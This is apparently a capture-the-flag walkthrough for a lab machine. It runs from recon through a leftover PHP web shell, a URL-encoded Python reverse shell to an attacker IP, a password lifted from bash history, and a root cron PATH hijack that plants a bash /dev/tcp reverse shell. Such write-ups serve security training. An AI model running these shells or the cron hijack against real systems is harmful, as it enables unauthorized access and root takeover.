# Recon

## Nmap

``` 
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
|_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
|_http-server-header: Apache/2.4.41 (Ubuntu) 


```



## Gobuster

``` 
/images               (Status: 301) [Size: 315] [--> http://10.10.249.192/images/] (images)
/css                  (Status: 301) [Size: 312] [--> http://10.10.249.192/css/]   (css)
/cvs                  (Status: 301) [Size: 312] [--> http://10.10.249.192/cvs/]   
/dist                 (Status: 301) [Size: 313] [--> http://10.10.249.192/dist/] (css and images)
``` 
## Nikto
``` 
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
``` 
# Upload Image

If we try to upload a php reverse shell we go to upload.php and we get the message:

"Hacked! If you dont want me to upload my shell, do better at filtering!" 

So the vulnerability might be in the filtering


- Content-type: image/jpeg (Not work)
- extension .php5 (not work)

We found that in the upload.php we have a comment with what is like the source code for the filtering for the cvs:
```
 seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) { #first occurence GG
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) { # check if file exists
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}
```

https://stackoverflow.com/questions/37008227/what-is-the-difference-between-name-and-tmp-name
Since we can do a directory transversal attack because we can insert: ../css/shell.jpg.php because it uses basename which removes all the paths and only takes shell.jpg.png.
We cant upload another shell. Since the hint says that the hackers might have left something behind and since the only filter that the previous application had is that the first occurence can only be .pdf we can search for shell.pdf.php or something to see if the attackers leaved the shell behind.

And in fact they did, when we search cvs/shell.pdf.php we get 
```
boom!
```


Doing some basic PHP enumeration we found that is vulnerable to php injection using the parameter cmd: 
```
http://10.10.249.192/cvs/shell.pdf.php?cmd=whoami
```
So we open the python server and upload our shell to the system: 
```
http://10.10.249.42/cvs/shell.pdf.php?cmd=python3%20-c%20%27import%20socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.9.0.149%22,4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(%22/bin/sh%22)%27
```

# Elevate privilege

```
$ cat .bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```

- bash_history gave us the password thisistheway123 for the use lachlan.

```
$ cat backup.sh
# todo: pita website backup as requested by her majesty

$ cat persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done

$ find / -perm /4000 2>/dev/null
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/fusermount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/at

```

- As we can see in the cron pkill does not have the full path and the PATH begins with /home/lachlan/bin so the first place that the cron will try to find the pkill executable is there.
- We create a a script withe same name with a reverse shell inside.

```
su lachlan
touch /home/lachlan/bin/pkill
echo "#!/bin/bash\nbash -c 'exec bash -i &>/dev/tcp/10.9.0.149/5555 <&1'" > pkill

```





